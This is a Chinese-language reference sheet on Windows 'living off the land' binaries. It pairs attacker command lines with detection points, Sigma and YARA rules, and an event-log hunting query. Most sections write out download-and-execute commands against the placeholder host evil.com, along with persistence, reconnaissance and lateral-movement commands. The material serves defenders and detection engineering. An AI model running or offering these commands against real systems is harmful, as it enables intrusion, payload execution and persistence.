# Living off the Land Binaries (LOLBins)

## 什么是 LOLBins

LOLBins 是 Windows 系统自带的合法二进制文件，可被攻击者滥用于：
- 下载文件
- 执行代码
- 绕过应用白名单
- 持久化

## 下载器类

### certutil.exe

```cmd
# 下载文件
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# Base64 解码
certutil -decode encoded.txt decoded.exe
```

**检测点**:
- 进程命令行包含 `-urlcache` 或 `-decode`
- 网络连接到非微软域名

### bitsadmin.exe

```cmd
# 下载文件
bitsadmin /transfer myJob /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# 创建持久任务
bitsadmin /create 1 && bitsadmin /addfile 1 http://evil.com/payload.exe C:\temp\payload.exe && bitsadmin /SetNotifyCmdLine 1 C:\temp\payload.exe NULL && bitsadmin /resume 1
```

**检测点**:
- bitsadmin 下载到可疑路径
- 设置 NotifyCmdLine

### curl / wget (PowerShell)

```powershell
# PowerShell 下载
Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile payload.exe
(New-Object Net.WebClient).DownloadFile("http://evil.com/payload.exe", "payload.exe")
```

### mshta.exe

```cmd
# 执行远程 HTA
mshta http://evil.com/payload.hta

# 内联执行
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"":close")
```

## 代码执行类

### msiexec.exe

```cmd
# 远程 MSI 执行
msiexec /q /i http://evil.com/payload.msi

# 本地执行
msiexec /q /i C:\temp\payload.msi
```

### wmic.exe

```cmd
# 执行远程 XSL
wmic os get /format:"http://evil.com/payload.xsl"

# 进程创建
wmic process call create "powershell -ep bypass"
```

### cmstp.exe

```cmd
# 通过 INF 文件执行
cmstp /s /ns C:\temp\payload.inf
```

### regsvr32.exe

```cmd
# 远程 SCT 执行
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll

# 本地执行
regsvr32 /s C:\temp\payload.dll
```

### rundll32.exe

```cmd
# 执行 DLL
rundll32 C:\temp\payload.dll,EntryPoint

# 执行 JavaScript
rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell")
```

### msbuild.exe

```cmd
# 编译并执行内嵌代码
msbuild C:\temp\payload.xml
```

### csc.exe / vbc.exe

```cmd
# 编译并执行
csc /out:payload.exe payload.cs && payload.exe
```

## 脚本执行类

### wscript.exe / cscript.exe

```cmd
# 执行 VBS/JS
wscript C:\temp\payload.vbs
cscript C:\temp\payload.js
```

### powershell.exe

```powershell
# 编码执行
powershell -ep bypass -enc <base64>

# 下载并执行
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
```

**检测点**:
- `-enc` / `-encodedcommand`
- `-ep bypass` / `-executionpolicy bypass`
- `IEX` / `Invoke-Expression`
- `DownloadString` / `DownloadFile`

### cmd.exe

```cmd
# 执行远程命令
cmd /c "powershell -ep bypass"
```

## 持久化类

### schtasks.exe

```cmd
# 创建计划任务
schtasks /create /tn "Update" /tr "C:\temp\payload.exe" /sc onlogon /ru System
```

### sc.exe

```cmd
# 创建服务
sc create EvilService binPath= "C:\temp\payload.exe" start= auto
```

### reg.exe

```cmd
# 添加启动项
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\temp\payload.exe"
```

## 信息收集类

### nltest.exe

```cmd
# 域信息
nltest /dclist:domain.com
nltest /domain_trusts
```

### net.exe

```cmd
# 用户信息
net user
net localgroup administrators
net group "Domain Admins" /domain
```

### dsquery.exe

```cmd
# AD 查询
dsquery user -name *admin*
dsquery computer
```

## 横向移动类

### psexec.exe

```cmd
# 远程执行
psexec \\target -u user -p pass cmd.exe
```

### wmic.exe

```cmd
# 远程执行
wmic /node:target process call create "cmd.exe /c payload.exe"
```

### winrm.cmd

```cmd
# WinRM 执行
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c payload.exe"} -r:target
```

## 检测规则

### Sigma 规则示例

```yaml
title: Certutil Download
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'certutil'
      - '-urlcache'
  condition: selection
level: high

---
title: Encoded PowerShell
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - '-enc'
      - '-encodedcommand'
      - '-ec '
  condition: selection
level: high
```

### YARA 规则示例

```yara
rule LOLBin_Command
{
    strings:
        $certutil = "certutil" ascii wide nocase
        $urlcache = "-urlcache" ascii wide nocase
        $bitsadmin = "bitsadmin" ascii wide nocase
        $transfer = "/transfer" ascii wide nocase

    condition:
        ($certutil and $urlcache) or ($bitsadmin and $transfer)
}
```

## 快速检测命令

```powershell
# 检查可疑进程命令行
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} |
  Where-Object {
    $_.Message -match "certutil.*-urlcache" -or
    $_.Message -match "powershell.*-enc" -or
    $_.Message -match "mshta.*http" -or
    $_.Message -match "regsvr32.*/i:http"
  }
```

## 参考资源

- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/) (Linux)
- [MITRE ATT&CK - Signed Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
